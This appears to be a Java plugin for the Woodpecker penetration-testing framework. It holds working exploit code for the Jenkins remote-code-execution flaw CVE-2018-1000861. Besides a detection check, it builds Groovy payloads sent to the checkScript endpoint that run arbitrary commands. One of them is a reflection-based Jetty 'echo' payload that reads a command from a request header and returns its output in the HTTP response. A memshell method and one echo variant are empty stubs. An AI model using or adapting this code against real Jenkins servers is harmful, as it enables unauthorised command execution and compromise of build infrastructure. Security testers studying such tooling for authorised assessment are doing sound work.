package me.gv7.woodpecker.plugin;

import net.dongliu.requests.RawResponse;
import net.dongliu.requests.Requests;

import java.net.URLEncoder;
import java.util.HashMap;
import java.util.Map;

public class JenkinsCommonsUtils {

    public static boolean CVE_2018_1000861Check(String addr){
        final String vulPath = "securityRealm/user/admin/search/index?q=a";
        RawResponse send = Requests.get(addr + vulPath).verify(false).send();
        return send.readToText().contains("Search for");
    }

    public static String CVE_2018_1000861GeneratePayload(String addr,String payload){
        final String vulPath = "securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript" +
                "?sandbox=true" +
                "&value=";
        return addr + vulPath + URLEncoder.encode(payload);
    }


    public static String CVE_2018_1000861Exploit(String addr, String command){
        final String payload = "public class x {" +
                "public x(){" +
                "\""+command+"\".execute()" +
                "}" +
                "}";
        String address = JenkinsCommonsUtils.CVE_2018_1000861GeneratePayload(addr, payload);
        try {
            RawResponse response = Requests.get(address).verify(false).send();
            return response.readToText();
        }catch (Exception e){
            return "发送失败";
        }
    }

    public static String CVE_2018_1000861Echo(String addr, String command){
        final String vulPath = "securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript";
        Map<String, String> body = new HashMap<>();
        body.put("sandbox","true");
        body.put("value", Jetty9Echo());

        Map<String, String> headers = new HashMap<>();
        headers.put("i", command);
        try {
            RawResponse response = Requests.post(addr + vulPath).verify(false)
                    .headers(headers).body(body).send();
            return response.readToText();
        }catch (Exception e){
            return "发送失败";
        }
    }

    private static String Jetty9Echo(){
        return "public class Test2 {\n" +
                "public Test2() {\n" +
                "try {\n" +
                "Class clazz = Thread.currentThread().getClass();\n" +
                "java.lang.reflect.Field field = clazz.getDeclaredField(\"threadLocals\");\n" +
                "field.setAccessible(true);\n" +
                "Object obj = field.get(Thread.currentThread());\n" +
                "field = obj.getClass().getDeclaredField(\"table\");\n" +
                "field.setAccessible(true);\n" +
                "obj = field.get(obj);\n" +
                "Object[] obj_arr = (Object[]) obj;\n" +
                "for (Object o : obj_arr) {\n" +
                "if (o == null) continue;\n" +
                "field = o.getClass().getDeclaredField(\"value\");\n" +
                "field.setAccessible(true);\n" +
                "obj = field.get(o);\n" +
                "if (obj != null && obj.getClass().getName().endsWith(\"HttpConnection\")) {\n" +
                "java.lang.reflect.Method method = obj.getClass().getMethod(\"getHttpChannel\");\n" +
                "Object httpChannel = method.invoke(obj);\n" +
                "method = httpChannel.getClass().getMethod(\"getRequest\");\n" +
                "obj = method.invoke(httpChannel);\n" +
                "method = obj.getClass().getMethod(\"getHeader\", String.class);\n" +
                "String i = (String) method.invoke(obj, \"i\");\n" +
                "if (i != null && !i.isEmpty()) {\n" +
                "String res = new java.util.Scanner(Runtime.getRuntime().exec(i).getInputStream()).useDelimiter(\"\\\\A\").next();\n" +
                "method = httpChannel.getClass().getMethod(\"getResponse\");\n" +
                "obj = method.invoke(httpChannel);\n" +
                "method = obj.getClass().getMethod(\"getWriter\");\n" +
                "java.io.PrintWriter printWriter = (java.io.PrintWriter) method.invoke(obj);\n" +
                "printWriter.println(res);\n" +
                "}\n" +
                "break;\n" +
                "}\n" +
                "}\n" +
                "} catch (Exception e) {\n" +
                "}\n" +
                "}\n" +
                "}";
    }

    public static String Jetty8Echo(){
        return "";
    }

    public static String CVE_2018_1000861Memshell(String addr, String command){
        return "1";
    }
}
